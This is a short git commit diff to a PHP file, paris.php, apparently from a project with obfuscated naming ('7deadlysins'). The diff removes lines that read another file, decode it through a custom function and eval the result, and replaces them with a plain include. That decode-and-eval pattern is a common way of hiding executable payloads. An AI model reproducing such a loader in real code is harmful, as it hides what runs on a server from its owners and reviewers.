71ee831c9e344f460e3ed412b03d9fe775907798
0xbeethoven <150875212+0xbeethoven@users.noreply.github.com>
2023-12-16 00:07:13 +0900

    Update paris.php

--- paris.php
+++ paris.php
@@ -1,7 +1,5 @@
 <?php
 include '7deadlysins/load.php';
 include '7deadlysins/julia.php';
-$シ = file_get_contents('7deadlysins/leo.php');
-    $薄 = juliaFunction($シ, $犬);
-    eval('?>' . $薄);
+include '7deadlysins/greed.php'
 ?>
